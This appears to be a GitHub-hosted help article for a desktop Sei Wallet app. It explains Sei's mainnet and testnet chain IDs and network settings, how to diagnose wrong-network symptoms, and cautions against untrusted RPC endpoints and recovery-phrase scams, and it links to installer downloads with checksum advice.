![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Chain ID 1329 and the Sei network settings in Sei Wallet</h1>

<p align="center">Chain ID 1329, the Pacific mainnet settings, and when you need them.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=windows&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=linux&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

| Platform | Requirements | File |
|:--|:--|:--|
| 🪟 Windows | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

A chain ID is a number that names a network. Sei mainnet is **1329**, its Cosmos-side network name is `pacific-1`, and the testnet is **1328** (`atlantic-2`). If a wallet is pointed at the wrong one, everything else looks broken: balances vanish, transactions never confirm, and applications refuse to connect.

This article covers what the number does, where it appears, and the four symptoms that mean you are on the wrong network rather than in a broken wallet.

## What the chain ID protects

Every EVM transaction includes the chain ID in what gets signed. That is what stops a transaction built for one chain from being replayed on another: a signature valid for 1329 is not valid for 1328, and neither is valid on Ethereum.

Two things follow:

- **The ID is part of the security, not a label.** A wallet that let you sign without it would let a testnet transaction be replayed on mainnet.
- **The ID must match the network the transaction is for.** A mismatch is rejected rather than silently misapplied, which is the good failure.

## The settings that matter

| Setting | Mainnet | Testnet |
|---|---|---|
| Chain ID | 1329 | 1328 |
| Network name (Cosmos) | `pacific-1` | `atlantic-2` |
| EVM RPC | the public Sei RPC listed in Sei's docs | the public testnet RPC listed there |
| Currency symbol | SEI | SEI |
| Explorer | `seiscan.io` | `testnet.seiscan.io` |

Sei's documentation lists these; if a value has changed since, the documentation is the authority rather than this table. The RPC endpoint is the node the wallet talks to, which is a separate concern from the chain ID and is covered in [switching endpoints](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md).

## One address, several chains

This is the part that produces most "my funds disappeared" reports.

An EVM address is not owned by a chain. The same `0x…` address exists on Sei, on Ethereum, on every EVM network, because it is derived from a key rather than registered with a chain. What differs is the balance *at that address on each chain*.

So a wallet pointed at Ethereum shows an empty Sei account, and it is not lying — it is answering a different question. Before assuming anything is lost, confirm which network the wallet is displaying.

The purely Sei-specific version is the two address forms of one account: `0x…` and `sei1…`. Those are covered in [the two address forms](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md).

## Where the setting lives

In this app, the network is part of the wallet's configuration: [the wallet's network selector](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) chooses which network the interface is reading, and any custom endpoint carries its own chain ID with it.

In a general EVM wallet the network is added as a custom entry, with the five fields above. That is the setup described in [the MetaMask network setup](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) for the extension route.

One rule for both: **the chain ID and the RPC endpoint must describe the same network.** A mainnet chain ID with a testnet endpoint produces a wallet that connects and then fails on every transaction.

## The four symptoms of a wrong network

1. **Balance shows zero** on an account you know holds funds. Wrong chain, almost always.
2. **A transaction is rejected** with an error about the chain, the network, or an invalid signature.
3. **A transaction sits pending forever** because it was broadcast to a network that does not know about it — [transactions that never confirm](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) covers that state.
4. **An application will not connect**, or connects and shows an empty account, because it expects 1329 and the wallet is elsewhere.

All four are configuration, not loss. Check the network before checking anything else — it is the cheapest diagnosis in this whole set. If the account you are looking at is the doubt rather than the network, [where your address comes from](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md) settles that first.

## Testnet is a different asset

Testnet SEI exists to be spent on nothing. It has no market value, it cannot be transferred to mainnet, and a mainnet wallet cannot see it.

That matters in two ways. If you are testing, a "missing" balance is usually a network mismatch rather than a failed faucet. If you sent real SEI to a testnet address, the funds are on the mainnet address you actually sent to — or, if you genuinely broadcast on the testnet, they were never real funds. Test coins are for testing and nothing else; they have no path to mainnet value.

## What not to do

- **Do not add an RPC endpoint from a chat message or a random list.** A malicious endpoint can show you false balances and false confirmations. It cannot sign for you, but it can mislead you into signing something else.
- **Do not switch networks to "make a transaction go through".** If a transaction was broadcast on the wrong chain, switching the view does not move it; it just hides it.
- **Do not assume a chain ID is universal.** Sei's is 1329; another chain may use a number that looks similar, and the symbol does not disambiguate.
- **Do not re-import your phrase to fix a network problem.** Derivation has nothing to do with which network the app displays.

## A five-second check before any transfer

Before you send, look at two things on the confirmation screen: the network name and the recipient. If either is not what you expect, cancel and fix it. That habit prevents the entire class of wrong-network transfers, which are the ones that cannot be undone.

## Frequently asked questions

**What is Sei's chain ID?** 1329 on mainnet, with the Cosmos network name `pacific-1`. Testnet is 1328, `atlantic-2`.

**Why does my balance show zero?** Most often the wallet is on another network. Confirm 1329 before anything else.

**Can the same address exist on two chains?** Yes. An EVM address is derived from a key, not issued by a chain, so the address is the same everywhere and the balance is per chain.

**Is chain ID 1329 the same as 0x531?** 1329 in decimal is `0x531` in hexadecimal. Some tools display one, some the other; they name the same network.

**What happens if I send to a testnet address?** Nothing of value moves if you are on the testnet. If you are on mainnet, the address is just an address, and the transfer is final.

**Do I need to add Sei manually in this app?** The app ships with its network configuration; manual entry is the general-EVM-wallet route, described in the MetaMask comparison.

**Can a wrong chain ID lose funds?** The transaction is rejected rather than misapplied, which is the point of the ID. The loss case is sending to the right address on the wrong chain, which is a network choice rather than an ID mismatch.

## Download Sei Wallet

| Platform | Installer |
|:--|:--|
| 🪟 Windows | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| 🍎 macOS | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| 🐧 Linux | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [RPC endpoints for Sei Wallet and what they change](https://github.com/sei-chain/sei-wallet-setup/blob/main/rpc-endpoints-and-what-they-change.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
- [Add Sei to MetaMask, or use a Sei wallet instead](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md)
